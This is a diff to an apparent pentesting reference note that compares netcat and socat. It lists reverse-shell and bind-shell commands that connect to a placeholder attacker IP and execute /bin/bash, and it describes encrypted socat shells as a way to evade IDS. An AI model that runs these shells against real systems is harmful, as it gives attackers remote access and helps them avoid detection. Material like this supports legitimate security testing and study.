@@ -5,22 +5,37 @@ date:: 2021-10-28
 
 Socat: An anything-to-anything connector!
 
-## "socat" vs. "netcat"
+# "socat" vs. "netcat"
 
 Equivalent commands between socat and netcat:
 
-| Role                     | netcat                                   | socat                                                  |
-|:------------------------ |:---------------------------------------- |:------------------------------------------------------ |
-| Reverse shell (attacker) | `nc -lnp $LISTENER_PORT`                    | `socat TCP-LISTEN:$LISTENER_PORT -`                       |
-| Reverse shell (target)   | `nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash` | `socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"` |
-| Bind shell (attacker)    | `nc $TARGET_IP $LISTENER_PORT`              | `socat TCP:$TARGET_IP:$LISTENER_PORT`                      |
-| Bind shell (target)      | `nc -lnp $LISTENER_PORT -e /bin/bash`        | `socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"`      |
+```bash
+# Reverse shell (attacker)
+#
+nc -lnp $LISTENER_PORT
+socat TCP-LISTEN:$LISTENER_PORT -
+
+# Reverse shell (target)
+#
+nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash
+socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"
+
+# Bind shell (attacker)
+#
+nc $TARGET_IP $LISTENER_PORT
+socat TCP:$TARGET_IP:$LISTENER_PORT
+
+# Bind shell (target)
+#
+nc -lnp $LISTENER_PORT -e /bin/bash
+socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"
+```
 
 Socat gets us an interactive login shell right out the gate, though we're still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.
 
 * [Using "netcat"](netcat.md)
 
-### Socat Encrypted Shells
+## Socat Encrypted Shells
 
 Socat can also make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.
 
@@ -49,7 +64,7 @@ socat \
 
 The `verify=0` directive turns off certificate validation, so this isn't a "secure" connection in the sense that it's been *authenticated*, but it is secure in the sense that it's *encrypted*.
 
-## Shell "Stabilization"
+# Shell "Stabilization"
 
 Shell "stabilization" refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.
 
